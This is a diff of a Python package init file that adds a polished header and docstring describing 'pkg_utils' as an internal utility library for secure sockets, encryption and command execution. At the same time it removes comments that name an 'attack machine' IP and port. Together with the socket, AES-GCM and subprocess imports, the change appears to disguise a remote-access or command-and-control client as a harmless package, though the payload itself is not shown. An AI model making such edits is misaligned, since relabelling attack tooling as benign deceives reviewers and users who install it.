@@ -1,14 +1,37 @@
+# pkg_utils - Core Initialization Module
+# This file initializes the pkg_utils package, providing core utilities 
+# for secure connections, encrypted data handling, and file operations.
+#
+# Version: 2.3.4
+# Author: Internal Dev Team
+# 
+# Usage:
+#    import pkg_utils
+#    # Initialize secure system-level functions
+#    pkg_utils.init_secure_config()
+#
+# Notes:
+# - Use pkg_utils for all socket-based operations and secure data processing
+
+"""
+Package Initialization for pkg_utils
+
+This package provides low-level utilities for:
+    - Secure socket communications
+    - Encrypted file handling
+    - System command execution
+
+Modules included:
+    - system: handles socket and subprocess operations
+    - config: manages connection configurations and key storage
+"""
+
 import socket
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import subprocess
 import os
 import json
 import random
-
-# 'localhost' # on same machine
-# REACH_IP = 'localhost' # IP of attack machine
-# REACH_PORT = 5050
-# read in config vars
 
 def convert_path(file_name):
     script_dir = os.path.dirname(os.path.abspath(__file__))
